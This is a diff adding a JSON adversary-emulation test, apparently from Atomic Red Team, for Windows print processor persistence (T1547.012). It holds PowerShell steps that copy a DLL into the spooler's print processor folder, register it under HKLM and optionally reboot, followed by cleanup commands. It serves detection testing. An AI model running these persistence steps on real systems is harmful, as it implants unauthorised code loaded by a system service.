@@ -1,0 +1,52 @@
+{
+  "id": "f7d38f47-c61b-47cc-a59d-fc0368f47ed0",
+  "name": "Print Processors",
+  "description": "Establishes persistence by creating a new print processor registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors.\nThe new print processor will point to a DLL which will be loaded by the spooler service after a reboot. The DLL will then create the file AtomicTest.txt in C:\\Users\\Public\\ as validation that the test is successful.\n\nNote: The test assumes a x64 Windows operating system.\n\nThe payload source code is based on a blog post by stmxcsr: [https://stmxcsr.com/persistence/print-processor.html](https://stmxcsr.com/persistence/print-processor.html)\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "b30f50ab-2239-4789-8a5c-0d7ec89a8e7f",
+      "type": "execute-command",
+      "data": {
+        "command": "if( $(get-service -Name spooler).StartType -eq \"Disabled\") {Set-Service -Name \"spooler\" -StartupType Automatic}\nnet stop spooler\nCopy-Item \"$PathToAtomicsFolder\\T1547.012\\bin\\AtomicTest.dll\" C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\AtomicRedTeam\" /v \"Driver\" /d \"AtomicTest.dll\" /t REG_SZ /f\nnet start spooler\nif(#{restart}){\n  Restart-Computer\n}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "9f8a67b1-ce20-44d8-9ac3-fe26375ebe91",
+      "type": "execute-command",
+      "data": {
+        "command": "net stop spooler\nrm -force C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll -ErrorAction SilentlyContinue\nrm -force C:\\Users\\Public\\AtomicTest.txt -ErrorAction SilentlyContinue\nremove-item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\AtomicRedTeam\" -Force -ErrorAction SilentlyContinue\nnet start spooler\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "b30f50ab-2239-4789-8a5c-0d7ec89a8e7f",
+      "p": "on-success",
+      "o": "9f8a67b1-ce20-44d8-9ac3-fe26375ebe91"
+    },
+    {
+      "s": "b30f50ab-2239-4789-8a5c-0d7ec89a8e7f",
+      "p": "on-failure",
+      "o": "9f8a67b1-ce20-44d8-9ac3-fe26375ebe91"
+    }
+  ],
+  "tags": [
+    "T1547.012",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "restart",
+      "type": "integer",
+      "description": "set to 1 if you want the computer to reboot as part of the test",
+      "value": "0"
+    }
+  ]
+}
